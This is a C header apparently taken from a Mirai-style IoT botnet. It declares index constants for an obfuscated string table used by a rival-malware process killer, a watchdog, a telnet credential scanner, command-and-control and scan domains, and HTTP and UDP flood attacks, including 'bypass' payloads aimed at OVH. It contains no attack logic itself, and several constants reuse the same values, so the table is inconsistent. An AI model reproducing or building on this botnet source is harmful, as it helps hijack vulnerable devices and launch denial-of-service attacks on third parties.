#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value
{
    char *val;
    uint16_t val_len;

    #ifdef DEBUG
        BOOL locked;
    #endif
};
        /* Dynamic Killer, Stable */
#define TABLE_EXEC_SUCCESS 1
#define TABLE_KILLER_PROC 2
#define TABLE_KILLER_EXE 3
#define TABLE_KILLER_FD 4
#define TABLE_KILLER_TCP 5
#define TABLE_KILLER_STATUS 6
#define TABLE_KILLER_CMDLINE 7
#define TABLE_KILLER_TMP 8
#define TABLE_KILLER_DATALOCAL 9
#define TABLE_KILLER_QTX 10
#define TABLE_KILLER_DOT 11
#define TABLE_KILLER_ARM 12
#define TABLE_KILLER_X86 13
#define TABLE_KILLER_SH4 14
#define TABLE_KILLER_MIPS 15
#define TABLE_KILLER_MPSL 16
#define TABLE_KILLER_SDA 17
#define TABLE_KILLER_MTD 18

        /* WatchDog */
#define TABLE_WATCHDOG_1 19
#define TABLE_WATCHDOG_2 20
#define TABLE_WATCHDOG_3 21
#define TABLE_WATCHDOG_4 22
#define TABLE_WATCHDOG_5 23
#define TABLE_WATCHDOG_6 24
#define TABLE_WATCHDOG_7 25
#define TABLE_WATCHDOG_8 26
#define TABLE_WATCHDOG_9 27
#define TABLE_RANDOM 28

        /* Scanner */
#define TABLE_SCAN_SHELL 29
#define TABLE_SCAN_ENABLE 30
#define TABLE_SCAN_SYSTEM 31
#define TABLE_SCAN_SH 32
#define TABLE_SCAN_LSHELL 33
#define TABLE_SCAN_QUERY 34
#define TABLE_SCAN_RESP 35
#define TABLE_SCAN_NCORRECT 36
#define TABLE_SCAN_ASSWORD 37
#define TABLE_SCAN_OGIN 38
#define TABLE_SCAN_ENTER 39
#define TABLE_CNC_DOMAIN 40
#define TABLE_SCAN_DOMAIN 41
#define TABLE_KILLER_MAPS 42
#define TABLE_KILLER_QTX2 43
#define TABLE_KILLER_HAKAI 44

        /* HTTP Attack */
#define TABLE_ATK_KEEP_ALIVE            45
#define TABLE_ATK_ACCEPT                46
#define TABLE_ATK_ACCEPT_LNG            47
#define TABLE_ATK_CONTENT_TYPE          48
#define TABLE_ATK_SET_COOKIE            49
#define TABLE_ATK_REFRESH_HDR           50
#define TABLE_ATK_LOCATION_HDR          51
#define TABLE_ATK_SET_COOKIE_HDR        52
#define TABLE_ATK_CONTENT_LENGTH_HDR    53
#define TABLE_ATK_TRANSFER_ENCODING_HDR 54
#define TABLE_ATK_CHUNKED               55
#define TABLE_ATK_KEEP_ALIVE_HDR        56
#define TABLE_ATK_CONNECTION_HDR        57
#define TABLE_ATK_DOSARREST             58
#define TABLE_ATK_CLOUDFLARE_NGINX      59
#define TABLE_HTTP_ONE                  74  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_TWO                  75  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_THREE                76  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_FOUR                 77  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_FIVE                 78  /* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */

       /* TABLE RESOLVE */
#define TABLE_ATK_VSE                   75
#define TABLE_ATK_RESOLVER              76
#define TABLE_ATK_NSERV                 77

          /* Bypass Payloads */
#define TABLE_ATK_UDPKICK               77
#define TABLE_ATK_OVH                   78

         /* Memory Bool */
#define TABLE_MEM_ROUTE 79
#define TABLE_MEM_ASSWD 80

		/* Memory Killer */
#define TABLE_MEM_1 						81
#define TABLE_MEM_2 						81
#define TABLE_MEM_3 						83
#define TABLE_MEM_4 						84
#define TABLE_MEM_5 						85
#define TABLE_MEM_6 						86
#define TABLE_MEM_7 						87
#define TABLE_MEM_8 						88
#define TABLE_MEM_9 						89
#define TABLE_MEM_10 						90
#define TABLE_MEM_12 						91
#define TABLE_MEM_11 						92
#define TABLE_MEM_13 						93
#define TABLE_MEM_14 						94
#define TABLE_MEM_15 						95
#define TABLE_MEM_16 						96
#define TABLE_MEM_17 						97
#define TABLE_MEM_18 						98
#define TABLE_MEM_19 						99
#define TABLE_MEM_20 						100
#define TABLE_MEM_21 						101
#define TABLE_MEM_22 						102
#define TABLE_MEM_23 						103
#define TABLE_MEM_24 						104
#define TABLE_MEM_25 						105
#define TABLE_MEM_26 						106
#define TABLE_MEM_27 						107
#define TABLE_MEM_28 						108
#define TABLE_MEM_29 						109
#define TABLE_MEM_30 						110
#define TABLE_MEM_31 						111
#define TABLE_MEM_32 						112
#define TABLE_MEM_33 						113
#define TABLE_MEM_34 						114
#define TABLE_MEM_35 						115
#define TABLE_MEM_36 						116
#define TABLE_MEM_37 						117
#define TABLE_MEM_38 						118
#define TABLE_MEM_39 						119
#define TABLE_MEM_40 						120

    /* Other HTTP UserAgents */
#define TABLE_HTTP_6                    121
#define TABLE_HTTP_7                    122
#define TABLE_HTTP_8                    123
#define TABLE_HTTP_9                    124
#define TABLE_HTTP_10                   125
#define TABLE_HTTP_11                   126
#define TABLE_HTTP_12                   127
#define TABLE_HTTP_13                   128
#define TABLE_HTTP_14                   129
#define TABLE_HTTP_15                   130

#define TABLE_MAX_KEYS 131

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
